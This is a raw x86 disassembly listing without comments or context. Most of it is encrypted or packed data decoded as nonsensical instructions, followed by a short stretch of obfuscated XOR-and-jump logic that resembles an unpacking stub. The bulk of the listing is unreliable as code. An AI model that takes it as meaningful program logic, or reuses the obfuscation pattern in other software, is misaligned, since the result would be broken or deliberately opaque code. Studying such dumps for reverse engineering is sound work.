  40307d:	xor    BYTE PTR [ecx+0x7e],0x7e
  403081:	xchg   bl,al
  403083:	xchg   edi,eax
  403084:	pop    ecx
  403085:	push   esp
  403086:	aaa    
  403087:	adc    edi,DWORD PTR [edx+0x28f7c04a]
  40308d:	and    dl,BYTE PTR [ebp+0x8]
  403090:	mov    edx,cs
  403092:	(bad)  
  403093:	leave  
  403094:	push   ds
  403095:	mov    edi,0x358cbeb6
  40309a:	inc    edx
  40309b:	push   ss
  40309c:	enter  0xd20b,0x93
  4030a0:	xchg   BYTE PTR [ecx],bh
  4030a2:	xchg   bl,cl
  4030a4:	mov    cs,edi
  4030a6:	mul    DWORD PTR [ebp+0x31]
  4030a9:	fisubr DWORD PTR ds:0xef15fe66
  4030af:	mov    ds:0x20f1e0b9,eax
  4030b4:	push   es
  4030b5:	jle    0x403111
  4030b7:	and    BYTE PTR [ebx+0x272de62c],cl
  4030bd:	fidiv  WORD PTR [edi-0x426271e6]
  4030c3:	mul    BYTE PTR [ecx-0x742c84a6]
  4030c9:	jmp    DWORD PTR [eax-0x50ad5a02]
  4030cf:	pop    esi
  4030d0:	ss pop esi
  4030d2:	test   eax,0x27f98764
  4030d7:	add    eax,0x41ae7c47
  4030dc:	(bad)  
  4030dd:	sbb    DWORD PTR fs:[edi-0x18],edx
  4030e1:	push   edi
  4030e2:	pop    esp
  4030e3:	(bad)
  4030e6:	and    DWORD PTR [eax],eax
  4030e8:	std    
  4030e9:	out    dx,eax
  4030ea:	das    
  4030eb:	sahf   
  4030ec:	scas   al,BYTE PTR es:[edi]
  4030ed:	pop    ds
  4030ee:	es push cs
  4030f0:	pop    DWORD PTR [ebx-0x5bfbcdf1]
  4030f6:	leave  
  4030f7:	sub    BYTE PTR [edx],bh
  4030f9:	cdq    
  4030fa:	je     0x4030e5
  4030fc:	shr    DWORD PTR [ebp-0x7d],cl
  4030ff:	xlat   BYTE PTR ds:[ebx]
  403100:	jnp    0x403124
  403102:	cs stos BYTE PTR es:[edi],al
  403104:	pop    edi
  403105:	sub    DWORD PTR [edx-0x4a],0xbb88450d
  40310c:	pop    es
  40310d:	mov    eax,0x2226d2ec
  403112:	scas   eax,DWORD PTR es:[edi]
  403113:	mov    bl,0xa5
  403115:	or     dl,bh
  403117:	test   eax,0x1ec7ec73
  40311c:	cmp    al,0xba
  40311e:	adc    WORD PTR [esi+0x28],sp
  403122:	push   ebx
  403123:	ja     0x4030b1
  403125:	xchg   ecx,esi
  403127:	adc    al,0x8a
  403129:	fisub  WORD PTR ss:[ebp+0x1b4ab23]
  403130:	mul    bh
  403132:	push   edi
  403133:	mov    ecx,?
  403135:	cs xchg edx,eax
  403137:	mov    dl,0xa6
  403139:	sar    BYTE PTR [eax+0x46b5b75b],0xb
  403140:	retf   0xf549
  403143:	adc    al,BYTE PTR [edx-0xb]
  403146:	(bad)  
  403147:	out    dx,al
  403148:	mov    dl,0xf8
  40314a:	call   ebx
  40314c:	ficom  WORD PTR [edx]
  40314e:	cwde   
  40314f:	or     al,0x11
  403151:	jmp    0x40319b
  403153:	mov    edi,0x3a131204
  403158:	test   DWORD PTR [ebx+0x5],esi
  40315b:	(bad)  
  40315c:	xor    BYTE PTR [ebx-0x3b2471c9],al
  403162:	ds pop esi
  403164:	mov    ch,0x7
  403166:	push   ebp
  403167:	sahf   
  403168:	ds lock mov dh,0xe3
  40316c:	push   esi
  40316d:	adc    ebp,DWORD PTR [edx-0x29]
  403170:	jge    0x40313f
  403172:	sbb    BYTE PTR [edx],bl
  403174:	test   al,0xb4
  403176:	mov    ebx,0x4952b944
  40317b:	leave  
  40317c:	dec    ebx
  40317d:	fbld   TBYTE PTR [ecx]
  40317f:	sub    DWORD PTR [ecx-0x61e58254],esp
  403185:	or     BYTE PTR [edx+0x137bad70],dh
  40318b:	nop
  40318c:	lds    eax,FWORD PTR [esi-0x31]
  40318f:	mov    DWORD PTR [ebp-0x74],edx
  403192:	je     0x403143
  403194:	les    eax,FWORD PTR [ebp+0x9d77823]
  40319a:	mov    edi,0x9d17db65
  40319f:	and    BYTE PTR [ebp+edi*4+0x9],0xa0
  4031a4:	mov    dh,0x7b
  4031a6:	int3   
  4031a7:	das    
  4031a8:	sbb    eax,0xf171dfb4
  4031ad:	lods   al,BYTE PTR ds:[esi]
  4031ae:	cli    
  4031af:	mov    esp,0xc8b67603
  4031b4:	pop    eax
  4031b5:	loop   0x40319f
  4031b7:	sbb    DWORD PTR [edi-0x407e6776],0xffffffbc
  4031be:	scas   eax,DWORD PTR es:[edi]
  4031bf:	in     al,0xa0
  4031c1:	stos   BYTE PTR es:[edi],al
  4031c2:	nop
  4031c3:	mov    ecx,0x99d7dd8a
  4031c8:	fs pop esp
  4031ca:	(bad)  
  4031cb:	adc    al,0x5a
  4031cd:	mov    dh,0xb1
  4031cf:	jl     0x4031f3
  4031d1:	fwait
  4031d2:	(bad)  
  4031d3:	push   eax
  4031d4:	inc    ebx
  4031d5:	sbb    ch,al
  4031d7:	xor    BYTE PTR [esi-0x4b],bh
  4031da:	(bad)  
  4031db:	add    cl,dl
  4031dd:	xchg   edx,eax
  4031de:	push   ds
  4031df:	cmp    eax,0x5fab82a8
  4031e4:	and    al,0xad
  4031e6:	ins    DWORD PTR es:[edi],dx
  4031e7:	and    DWORD PTR [eax],edi
  4031e9:	push   ss
  4031ea:	mov    dh,0x57
  4031ec:	addr16 lock stc 
  4031ef:	push   esi
  4031f0:	and    ebx,ebx
  4031f2:	jge    0x4031a8
  4031f4:	push   0x40
  4031f6:	out    0x20,al
  4031f8:	xor    al,0x81
  4031fa:	call   0xf82f3692
  4031ff:	cwde   
  403200:	adc    ebx,DWORD PTR ds:0x46354cde
  403206:	xor    ah,BYTE PTR [si-0x3a33]
  40320b:	jp     0x40318f
  40320d:	push   ecx
  40320e:	scas   al,BYTE PTR es:[edi]
  40320f:	daa    
  403210:	fidiv  WORD PTR [esi+edi*2+0x58]
  403214:	pusha  
  403215:	scas   al,BYTE PTR es:[edi]
  403216:	or     al,ch
  403218:	jle    0x403288
  40321a:	adc    eax,0xdce76fe4
  40321f:	inc    esp
  403220:	mov    al,ds:0x920c9278
  403225:	mov    ebx,0x80d7bb7d
  40322a:	aam    0xa5
  40322c:	mov    al,ds:0xc114a022
  403231:	and    eax,0x2a700f69
  403236:	xchg   esp,eax
  403237:	ror    DWORD PTR [eax-0x39e20e8],cl
  40323d:	inc    esi
  40323e:	ins    DWORD PTR es:[edi],dx
  40323f:	or     ah,bl
  403241:	jge    0x403200
  403243:	push   0x8fa887e3
  403248:	jb     0x403269
  40324a:	push   ds
  40324b:	leave  
  40324c:	pop    ecx
  40324d:	jno    0x40328e
  40324f:	dec    eax
  403250:	loope  0x40321b
  403252:	int3   
  403253:	les    edi,FWORD PTR [ebx]
  403255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403256:	sbb    eax,0x49bedc2e
  40325b:	xor    BYTE PTR [ecx-0x7a8a3439],0x1e
  403262:	sbb    DWORD PTR [ebx+0x3a],esi
  403265:	jp     0x4032dd
  403267:	pop    esp
  403268:	lea    edx,[ecx]
  40326a:	jbe    0x4031f6
  40326c:	shr    eax,1
  40326e:	mov    esi,0xfb62e2a6
  403273:	mov    esp,0x618a848e
  403278:	(bad)  
  403279:	out    dx,eax
  40327a:	sbb    edi,edi
  40327c:	xchg   esi,eax
  40327d:	repnz sub esp,eax
  403280:	xchg   DWORD PTR [ebp-0x7aa4895f],edx
  403286:	imul   ecx,DWORD PTR [eax+0x12820b4b],0xfffffffe
  40328d:	test   al,0x58
  40328f:	and    BYTE PTR ds:0x8ce7dd7f,0xd0
  403296:	fstp   QWORD PTR [eax+eiz*2+0x4]
  40329a:	call   0x4eee2fe
  40329f:	jne    0x4032a3
  4032a1:	mov    gs,WORD PTR [edi]
  4032a3:	cs xor eax,0xd36a62bd
  4032a9:	stc    
  4032aa:	sbb    eax,0x72f2a606
  4032af:	inc    ecx
  4032b0:	(bad)  
  4032b1:	hlt    
  4032b2:	jb     0x403287
  4032b4:	mov    DWORD PTR [edx],edi
  4032b6:	repz jmp 0x40323c
  4032b9:	push   esi
  4032ba:	mov    al,ds:0xa928d60e
  4032bf:	xchg   edx,eax
  4032c0:	daa    
  4032c1:	aaa    
  4032c2:	push   es
  4032c3:	icebp  
  4032c4:	adc    DWORD PTR [esi+0x3843f200],esi
  4032ca:	(bad)  
  4032cb:	push   ss
  4032cc:	push   cs
  4032cd:	rcr    DWORD PTR [ebx+0x12],cl
  4032d0:	mov    ebx,0xb6ac2618
  4032d5:	mov    ah,0xa1
  4032d7:	outs   dx,DWORD PTR ds:[esi]
  4032d8:	dec    eax
  4032d9:	sbb    eax,DWORD PTR [ebp-0x5a]
  4032dc:	int    0xf6
  4032de:	and    BYTE PTR [esi-0x4e],ch
  4032e1:	pushf  
  4032e2:	mov    al,0xb3
  4032e4:	fst    DWORD PTR [ecx+0x116bfb4]
  4032ea:	add    DWORD PTR ds:0x954a52bd,esi
  4032f0:	mov    ch,0x43
  4032f2:	js     0x4032e5
  4032f4:	retf   
  4032f5:	fidivr DWORD PTR [eax-0x2a]
  4032f8:	ds retf 
  4032fa:	or     BYTE PTR [esi],0x15
  4032fd:	pop    ebx
  4032fe:	ins    DWORD PTR es:[edi],dx
  4032ff:	xchg   ebp,eax
  403300:	adc    DWORD PTR [edx+0x6da30acf],eax
  403306:	xor    eax,0xafa4e8c1
  40330b:	lods   eax,DWORD PTR ds:[esi]
  40330c:	sbb    eax,0x15c98f81
  403311:	imul   ebx,DWORD PTR [edi-0x217e3a78],0xffffffe6
  403318:	mov    BYTE PTR [esi-0x80],0x90
  40331c:	lods   eax,DWORD PTR ds:[esi]
  40331d:	neg    edi
  40331f:	cs jecxz 0x403374
  403322:	jbe    0x403325
  403324:	arpl   WORD PTR [ecx+0x382a058d],sp
  40332a:	test   eax,0x4ceb6d1c
  40332f:	les    ebp,FWORD PTR [eax-0x14]
  403332:	mov    BYTE PTR [esi-0x454a2908],bh
  403338:	cwde   
  403339:	and    BYTE PTR [eax-0x4728f45b],al
  40333f:	pop    ecx
  403340:	cmp    eax,DWORD PTR ds:0x38c863fa
  403346:	fs mov dl,0x11
  403349:	xchg   esi,eax
  40334a:	cmp    BYTE PTR [esi-0x23b22540],al
  403350:	ds popa 
  403352:	outs   dx,BYTE PTR ds:[esi]
  403353:	arpl   WORD PTR [edx],bp
  403355:	push   edx
  403356:	or     eax,0x43dd02fa
  40335b:	sar    esi,cl
  40335d:	xor    al,0x58
  40335f:	xchg   esp,eax
  403360:	stc    
  403361:	pop    eax
  403362:	mov    cl,0x9f
  403364:	fdiv   DWORD PTR [ecx-0x5f]
  403367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403368:	xor    BYTE PTR [edi+0x69e34523],ch
  40336e:	add    al,BYTE PTR [edx+0x73]
  403371:	pop    eax
  403372:	popa   
  403373:	das    
  403374:	xchg   ebp,eax
  403375:	push   ds
  403376:	adc    BYTE PTR [ebx+eiz*8-0x19ecda5a],bl
  40337d:	sahf   
  40337e:	sti    
  40337f:	clc    
  403380:	mov    eax,ds:0x47f4daa2
  403385:	pop    eax
  403386:	(bad)  [ecx]
  403388:	(bad)  
  403389:	cmp    dl,BYTE PTR ds:0xecbafad4
  40338f:	sub    eax,0x3fb4531e
  403394:	bound  edx,QWORD PTR [esi+0x51]
  403397:	std    
  403398:	ds push 0x8607d29d
  40339e:	push   esi
  40339f:	mov    al,ds:0x4327589e
  4033a4:	je     0x4033e8
  4033a6:	mov    esp,0x17948ff2
  4033ab:	outs   dx,BYTE PTR ds:[esi]
  4033ac:	mov    es,eax
  4033ae:	xchg   edi,eax
  4033af:	shr    DWORD PTR [esi],cl
  4033b1:	push   ebp
  4033b2:	ins    DWORD PTR es:[edi],dx
  4033b3:	mov    cs,WORD PTR [edx]
  4033b5:	sti    
  4033b6:	ret    0x9e5a
  4033b9:	jns    0x4033e2
  4033bb:	loopne 0x4033ae
  4033bd:	fst    QWORD PTR [edi]
  4033bf:	push   edx
  4033c0:	ds gs mov ecx,0x5b90d5bb
  4033c7:	jno    0x403410
  4033c9:	out    0xf6,eax
  4033cb:	xchg   DWORD PTR [ecx+0x15],ebx
  4033ce:	push   ebx
  4033cf:	xor    BYTE PTR [esi+0x337810c4],bh
  4033d5:	out    dx,al
  4033d6:	jmp    0x93ac3c9f
  4033db:	sub    eax,0x121c7e9d
  4033e0:	mov    DWORD PTR [ebp+0x3a],eax
  4033e3:	or     DWORD PTR [edx+ecx*1-0x292ec9ec],ebx
  4033ea:	cmp    DWORD PTR [eax+0x604101ac],ebx
  4033f0:	mov    ecx,0x75ab297e
  4033f5:	ins    BYTE PTR es:[edi],dx
  4033f6:	push   esp
  4033f7:	outs   dx,DWORD PTR ds:[esi]
  4033f8:	rcr    eax,cl
  4033fa:	push   0xfc1731dd
  4033ff:	mov    bl,0xee
  403401:	test   BYTE PTR [ebx],bh
  403403:	jns    0x4033a0
  403405:	int    0xce
  403407:	lods   eax,DWORD PTR ds:[esi]
  403408:	lods   eax,DWORD PTR ds:[esi]
  403409:	sub    BYTE PTR [eax+edi*8-0x4a829c3c],ah
  403410:	mov    esi,0x3d72723c
  403415:	mov    edi,DWORD PTR [ebp+0x8]
  403418:	mov    edi,DWORD PTR [edi]
  40341a:	mov    edx,0x8a40
  40341f:	xor    ax,dx
  403422:	jmp    0x4037d3
  403427:	nop
  403428:	cdq    
  403429:	fst    QWORD PTR [ecx-0x6683aa03]
  40342f:	xlat   BYTE PTR ds:[ebx]
  403430:	push   cs
  403431:	mov    cl,0xfe
  403433:	sahf   
  403434:	out    0xdc,al
  403436:	dec    eax
  403437:	and    bl,BYTE PTR [esi]
  403439:	jle    0x4034b9
  40343b:	xor    BYTE PTR [ecx+0x7e],0x7e
  40343f:	shl    DWORD PTR [esi+ebx*4-0x1a],1
  403443:	(bad)  
  403444:	rcr    ecx,0x46
  403447:	dec    ebx
  403448:	loop   0x403412
  40344a:	cli    
  40344b:	and    esi,DWORD PTR [edi]
  40344d:	cmp    bh,al
  40344f:	cli    
  403450:	test   BYTE PTR [ebp+ebx*2+0x10],bh
  403454:	pusha  
  403455:	shl    DWORD PTR [ebx],0x92
  403458:	test   BYTE PTR [edi+edx*1-0x4a],bh
  40345c:	imul   DWORD PTR [ebp+0x4d]
  40345f:	test   al,bl
  403461:	mov    esp,0x374c9ed1
  403466:	or     BYTE PTR [ebx+0x35],dh
  403469:	mov    DWORD PTR [edx],esi
  40346b:	ret    
  40346c:	xchg   edx,eax
  40346d:	add    eax,0xde2f5838
  403472:	xchg   ebp,eax
  403473:	in     al,dx
  403474:	push   ss
  403475:	cs in  al,0x55
  403478:	add    esi,ebp
  40347a:	xchg   edx,eax
  40347b:	aas    
  40347c:	jl     0x4034db
  40347e:	xchg   BYTE PTR [ebx+0x32],al
  403481:	mul    BYTE PTR [edi-0x46]
  403484:	aad    0xef
  403486:	dec    edi
  403487:	and    ecx,edi
  403489:	outs   dx,BYTE PTR ds:[esi]
  40348a:	mov    WORD PTR [edi],ds
  40348c:	lds    ecx,FWORD PTR [ebp-0x79]
  40348f:	adc    al,0x20
  403491:	push   edi
  403492:	inc    eax
  403493:	pushf  
  403494:	(bad)  
  403495:	dec    esi
  403496:	pop    esi
  403497:	ret    
  403498:	push   ecx
  403499:	jle    0x40343c
  40349b:	test   al,0xc7
  40349d:	mov    esp,0xb8ccd22f
  4034a2:	iret   
  4034a3:	mov    edx,0xb7388e1f
  4034a8:	inc    esp
  4034a9:	mov    cs:0x708bbb5b,al
  4034af:	scas   eax,DWORD PTR es:[edi]
  4034b0:	test   DWORD PTR [ebx],esp
  4034b2:	xchg   BYTE PTR [esi+0x58845443],dh
  4034b8:	mov    ds,WORD PTR [ecx+eiz*4]
  4034bb:	std    
  4034bc:	shl    DWORD PTR ds:0x33698d31,cl
  4034c2:	out    0xa2,eax
  4034c4:	fiadd  DWORD PTR [ecx-0x69]
  4034c7:	mov    ah,0xca
  4034c9:	cmc    
  4034ca:	or     al,0x3d
  4034cc:	int    0x36
  4034ce:	cdq    
  4034cf:	pop    edi
  4034d0:	mov    al,ds:0x85df06b1
  4034d5:	push   edx
  4034d6:	jle    0x40345b
  4034d8:	mov    bl,0x38
  4034da:	lods   eax,DWORD PTR ds:[esi]
  4034db:	ss fs pushf 
  4034de:	add    al,0x4b
  4034e0:	rcl    BYTE PTR [ecx+0x77],0x8a
  4034e4:	sbb    ebx,DWORD PTR [edi+0x57a7dcec]
  4034ea:	pop    ss
  4034eb:	inc    ecx
  4034ec:	cmp    eax,0xee68e68d
  4034f1:	pop    esp
  4034f2:	push   esi
  4034f3:	mov    al,ds:0xbc5b3890
  4034f8:	xor    BYTE PTR [eax+0x66],ch
  4034fb:	xor    al,0x64
  4034fd:	and    edi,esi
  4034ff:	dec    ebx
  403500:	nop
  403501:	pushf  
  403502:	leave  
  403503:	repz push ebx
  403505:	jle    0x4034ad
  403507:	mov    bl,0xc3
  403509:	sti    
  40350a:	jbe    0x4034ae
  40350c:	inc    ebx
  40350d:	mov    dh,0xc3
  40350f:	mov    esp,0xf480a4ac
  403514:	dec    ecx
  403515:	sub    BYTE PTR [ebp-0x39],dl
  403518:	jl     0x403546
  40351a:	mov    bh,0xb7
  40351c:	stos   DWORD PTR es:[edi],eax
  40351d:	push   edx
  40351e:	xchg   BYTE PTR [eax+0x27],bh
  403521:	mov    cl,al
  403523:	push   edi
  403524:	mov    dh,0x76
  403526:	ds out dx,al
  403528:	xor    eax,0x3568022e
  40352d:	repz aam 0xa5
  403530:	enter  0xb686,0x7
  403534:	(bad)  [ecx+0x50]
  403537:	sub    eax,0x493b1a35
  40353c:	lds    esi,FWORD PTR [ecx-0x2]
  40353f:	push   ecx
  403540:	lahf   
  403541:	enter  0x52f6,0xaa
  403545:	cs pop ss
  403547:	or     ah,BYTE PTR [edx-0x73d9ef0c]
  40354d:	into   
  40354e:	sbb    BYTE PTR [eax],bl
  403550:	mov    esp,0x7f31b1fa
  403555:	xlat   BYTE PTR ds:[ebx]
  403556:	sti    
  403557:	(bad)  
  403558:	jle    0x4035b2
  40355a:	ret    0x7be8
  40355d:	in     al,0xb6
  40355f:	inc    ebp
  403560:	cmp    esi,DWORD PTR [esi-0x2218ecd6]
  403566:	loope  0x40352c
  403568:	dec    esp
  403569:	not    ch
  40356b:	push   0xa3b8084f
  403570:	mov    cl,0xa6
  403572:	or     ah,BYTE PTR [ebp+0x5b]
  403575:	mov    edx,edi
  403577:	cs pusha 
  403579:	mov    edx,0x979ffad6
  40357e:	lds    edx,FWORD PTR [esi+0x608e302b]
  403584:	call   0xf9c5002f
  403589:	xchg   edi,eax
  40358a:	lods   eax,DWORD PTR ds:[esi]
  40358b:	xchg   esi,eax
  40358c:	inc    esi
  40358d:	ret    
  40358e:	pop    esp
  40358f:	jae    0x403520
  403591:	loop   0x4035e1
  403593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403594:	mov    ecx,0x8f320d7
  403599:	pusha  
  40359a:	or     esp,ebx
  40359c:	std    
  40359d:	xchg   esp,eax
  40359e:	lods   al,BYTE PTR ds:[esi]
  40359f:	mov    ecx,0x7fb418fd
  4035a4:	mov    dh,0x56
  4035a6:	mov    bh,0x55
  4035a8:	mov    esi,DWORD PTR ds:0x21d6bbfd
  4035ae:	out    dx,eax
  4035af:	push   eax
  4035b0:	push   eax
  4035b1:	mov    ds:0xc9254d3e,eax
  4035b6:	icebp  
  4035b7:	lods   al,BYTE PTR ds:[esi]
  4035b8:	sbb    ch,BYTE PTR [edx+edi*1]
  4035bb:	push   eax
  4035bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035bd:	js     0x403584
  4035bf:	and    esp,DWORD PTR [ecx-0x1c]
  4035c2:	jmp    0xfd7d:0xd6b88510
  4035c9:	test   DWORD PTR [eax+0x2ee90d2b],edi
  4035cf:	daa    
  4035d0:	or     DWORD PTR [esi],0x67c8d70c
  4035d6:	mov    DWORD PTR ds:0xa2300ca0,0xa51d2c33
  4035e0:	lods   eax,DWORD PTR ds:[esi]
  4035e1:	add    DWORD PTR [ebp+0x54e6ce9e],ecx
  4035e7:	out    dx,al
  4035e8:	mov    ds:0x71c8da8b,al
  4035ed:	sbb    WORD PTR [esi],cx
  4035f0:	mov    edi,0x1d45a38
  4035f5:	fwait
  4035f6:	clc    
  4035f7:	leave  
  4035f8:	lea    ebp,[eax]
  4035fa:	adc    DWORD PTR [esi+edx*4+0x73f39608],edx
  403601:	dec    ebp
  403602:	in     al,dx
  403603:	jb     0x40367c
  403605:	ins    DWORD PTR es:[edi],dx
  403606:	dec    ecx
  403607:	addr16 stc 
  403609:	call   0x5c37:0x662dd4be
  403610:	xchg   DWORD PTR [edi+0x18],edi
  403613:	retf   0xe32a
  403616:	mov    edx,0x87f5180d
  40361b:	sub    eax,0x5df3aed9
  403620:	cmp    eax,0x13163169
  403625:	das    
  403626:	mov    WORD PTR [edx],cs
  403628:	add    eax,ebx
  40362a:	(bad)  
  40362b:	mov    eax,ds:0xa892a6ee
  403630:	aaa    
  403631:	cmp    al,0x18
  403633:	gs xchg ecx,eax
  403635:	sbb    dl,bh
  403637:	out    dx,eax
  403638:	jnp    0x403630
  40363a:	jge    0x40365c
  40363c:	push   edi
  40363d:	popa   
  40363e:	cmp    BYTE PTR [ebx],ah
  403640:	(bad)  
  403641:	sahf   
  403642:	fst    QWORD PTR [ebx+0x35e2b7e8]
  403648:	div    DWORD PTR [ebp-0x7225b78b]
  40364e:	dec    ebp
  40364f:	jle    0x4036c0
  403651:	adc    esi,DWORD PTR [eax-0x11088a71]
  403657:	add    eax,0xd9474450
  40365c:	mov    eax,ds:0x3d8a0c10
  403661:	iret   
  403662:	mov    ch,0xb4
  403664:	jmp    DWORD PTR ds:0x225d18b5
  40366a:	sti    
  40366b:	out    0x4b,eax
  40366d:	cmp    ecx,ebx
  40366f:	add    eax,0x8b84b334
  403674:	push   ebp
  403675:	enter  0x86ca,0x99
  403679:	mov    edx,0x230a4623
  40367e:	call   0xaf1c:0xf44b18c0
  403685:	(bad)  
  403686:	xor    DWORD PTR [ecx+ebx*1],ecx
  403689:	aad    0x62
  40368b:	and    DWORD PTR [ebp+0x4a86c90c],edi
  403691:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403692:	lahf   
  403693:	xchg   edx,eax
  403694:	or     DWORD PTR [ecx+0x5b],edx
  403697:	lea    ecx,[edx]
  403699:	dec    esi
  40369a:	daa    
  40369b:	ins    BYTE PTR es:[edi],dx
  40369c:	aas    
  40369d:	jne    0x4036de
  40369f:	test   al,0x13
  4036a1:	bnd ret 0xdca4
  4036a5:	pushf  
  4036a6:	test   al,0xab
  4036a8:	dec    esp
  4036a9:	fs xor bl,dl
  4036ac:	test   eax,0x11c5c173
  4036b1:	inc    eax
  4036b2:	(bad)  
  4036b3:	mov    WORD PTR [edx-0x8b50079],es
  4036b9:	pushf  
  4036ba:	cs cmp eax,0xd17f2773
  4036c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036c1:	das    
  4036c2:	das    
  4036c3:	add    DWORD PTR [eax-0x7d],eax
  4036c6:	fimul  DWORD PTR [edi+0xd]
  4036c9:	cli    
  4036ca:	dec    eax
  4036cb:	sbb    dh,BYTE PTR [ebx]
  4036cd:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4036cf:	sbb    ch,BYTE PTR [ebx]
  4036d1:	cdq    
  4036d2:	out    dx,eax
  4036d3:	in     eax,0xd5
  4036d5:	pushf  
  4036d6:	and    DWORD PTR ds:0x74c07464,ebx
  4036dc:	mov    cl,0x4b
  4036de:	sbb    al,0x95
  4036e0:	mov    ebx,0x7de119da
  4036e5:	inc    edi
  4036e6:	push   edi
  4036e7:	(bad)  
  4036e8:	cmp    dl,BYTE PTR [ebp-0x1e22fb5f]
  4036ee:	push   ss
  4036ef:	push   ebx
  4036f0:	shr    DWORD PTR [esp+0x15],0xc5
  4036f5:	and    al,0x58
  4036f7:	or     al,0xad
  4036f9:	fidiv  WORD PTR [edi+0x67d67f6a]
  4036ff:	das    
  403700:	mov    ebx,0x2fc112a1
  403705:	mov    al,ds:0x9da55f4e
  40370a:	scas   eax,DWORD PTR es:[edi]
  40370b:	mov    ch,ah
  40370d:	icebp  
  40370e:	pop    eax
  40370f:	out    0xfa,al
  403711:	nop
  403712:	mov    ah,0x2a
  403714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403715:	mov    bl,0xb3
  403717:	fwait
  403718:	inc    esp
  403719:	sar    DWORD PTR [ecx],cl
  40371b:	(bad)  
  40371c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40371d:	sti    
  40371e:	jmp    0xda77177b
  403723:	imul   eax,DWORD PTR [edx],0xffffffd4
  403726:	mov    esi,es
  403728:	ror    DWORD PTR [esi],1
  40372a:	adc    dh,0x50
  40372d:	dec    edi
  40372e:	sbb    DWORD PTR [ebx],edx
  403730:	movups xmm1,XMMWORD PTR es:[ecx-0x11c8eeb7]
  403738:	dec    esp
  403739:	mov    bl,0x4c
  40373b:	and    eax,DWORD PTR [ebx+0x5ee32d40]
  403741:	jge    0x40374c
  403743:	adc    al,0xa2
  403745:	scas   eax,DWORD PTR es:[edi]
  403746:	int    0x65
  403748:	mov    ds:0x779dbfd1,eax
  40374d:	aas    
  40374e:	xchg   esp,eax
  40374f:	lea    edi,[esi-0x30]
  403752:	jge    0x4037ca
  403754:	jno    0x4037b1
  403756:	jbe    0x4037d1
  403758:	not    DWORD PTR ds:0x113ecf48
  40375e:	add    ah,BYTE PTR [eax]
  403760:	pop    ebp
  403761:	sar    BYTE PTR [ebp+0x3832a507],0xb0
  403768:	jnp    0x40377c
  40376a:	mov    al,BYTE PTR [edx]
  40376c:	mov    eax,0xc18528cf
  403771:	lods   al,BYTE PTR ds:[esi]
  403772:	mov    al,ds:0x3bd8a097
  403777:	xor    DWORD PTR [eax+0x41f7170f],0xa5d96790
  403781:	retf   0xfb86
  403784:	or     al,0x44
  403786:	popf   
  403787:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403788:	push   ecx
  403789:	sub    dh,BYTE PTR [edi]
  40378b:	mov    cl,0xf7
  40378d:	mov    ah,0x48
  40378f:	cmp    ebp,eax
  403791:	ins    BYTE PTR es:[edi],dx
  403792:	lahf   
  403793:	sub    DWORD PTR [edi],edi
  403795:	adc    al,0x79
  403797:	sbb    eax,0xf20ae5ab
  40379c:	adc    DWORD PTR [eax],eax
  40379e:	call   0xb28f:0x5e9ff724
  4037a5:	jp     0x4037d3
  4037a7:	jb     0x403753
  4037a9:	test   eax,ebp
  4037ab:	out    dx,eax
  4037ac:	xchg   edi,eax
  4037ad:	cmp    BYTE PTR [ecx+0x29],dl
  4037b0:	sahf   
  4037b1:	bound  ebp,QWORD PTR [ebx]
  4037b3:	aam    0xc3
  4037b5:	pop    ebx
  4037b6:	mov    bh,0x4b
  4037b8:	aas    
  4037b9:	mov    cl,0xf7
  4037bb:	test   esp,esi
  4037bd:	stos   BYTE PTR es:[edi],al
  4037be:	ffree  st(2)
  4037c0:	mov    ah,0xd9
  4037c2:	jl     0x403751
  4037c4:	xor    BYTE PTR [eax+0x2e],ch
  4037c7:	nop
  4037c8:	arpl   WORD PTR [edx-0x67],sp
  4037cb:	dec    ebx
  4037cc:	mov    bl,0xcd
  4037ce:	cmp    eax,DWORD PTR [ebp-0x63]
  4037d1:	imul   ecx,DWORD PTR [eax],0x3b06ba
  4037d7:	add    BYTE PTR [esi+0x3],ah
  4037da:	ret    0x3b66
  4037dd:	pop    es
  4037de:	je     0x40382b
  4037e4:	mov    eax,DWORD PTR [ebp-0x14]
  4037e7:	xor    eax,ecx
  4037e9:	add    eax,esi
  4037eb:	mov    DWORD PTR [ebp-0x24],eax
  4037ee:	mov    eax,DWORD PTR [ebp-0x28]
  4037f1:	mov    di,WORD PTR [ebp-0x2c]
  4037f5:	mov    ebx,0x8a40
  4037fa:	xor    di,bx
  4037fd:	add    di,dx
  403800:	movzx  edx,di
  403803:	mov    edi,DWORD PTR [ebp-0x8]
  403806:	xor    edi,ecx
  403808:	lea    edx,[edx+edi*1+0x32729d]
  40380f:	add    DWORD PTR [eax],edx
  403811:	mov    eax,DWORD PTR [ebp-0x20]
  403814:	mov    edx,DWORD PTR [ebp-0x8]
  403817:	mov    edi,DWORD PTR [ebp-0x24]
  40381a:	xor    edx,ecx
  40381c:	add    edx,esi
  40381e:	imul   edx,edi
  403821:	sub    DWORD PTR [eax],edx
  403823:	mov    eax,DWORD PTR [ebp-0x14]
  403826:	jmp    0x4028b3
  40382b:	mov    eax,DWORD PTR [ebp-0xc]
  40382e:	mov    edx,DWORD PTR [ebp-0x18]
  403831:	xor    eax,edx
  403833:	cmp    eax,0x7aa80c5f
  403838:	je     0x402858
  40383e:	mov    eax,DWORD PTR [ebp-0x10]
  403841:	add    DWORD PTR [eax],0x7403501
  403847:	jmp    0x402858
  40384c:	mov    eax,DWORD PTR [ebp-0x1c]
  40384f:	cmp    DWORD PTR [eax],edi
  403851:	je     0x402858
  403857:	mov    eax,0x800f1c9a
  40385c:	jmp    0x4028b7
  403861:	push   ebp
  403862:	mov    ebp,esp
  403864:	sub    esp,0x44
  403867:	push   edi
  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x430526,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e7e6,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e7e6
